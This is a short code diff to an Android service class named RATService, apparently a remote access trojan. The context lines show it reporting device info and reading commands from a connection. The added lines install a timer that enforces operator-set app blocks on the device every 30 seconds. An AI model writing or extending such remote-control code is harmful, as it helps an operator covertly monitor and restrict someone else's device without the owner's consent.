@@ -544,6 +544,21 @@ public class RATService extends Service {
                     // Send initial device info
                     sendDeviceInfo();
 
+                    // ── Block enforcement timer ───────────────────────────────────────────
+                    final Handler blockHandler = new Handler(Looper.getMainLooper());
+                    final Runnable enforceBlocksRunnable = new Runnable() {
+                        @Override
+                        public void run() {
+                            if (appManagerModule != null && isRunning.get()) {
+                                appManagerModule.enforceBlocks();
+                            }
+                            blockHandler.postDelayed(this, 30000); // every 30 seconds
+                        }
+                    };
+                    blockHandler.post(enforceBlocksRunnable);
+                    // ── End block enforcement ─────────────────────────────────────────────
+
+
                     // Main processing loop - blocks on readLine()
                     String line;
                     long lastReadTime = System.currentTimeMillis();
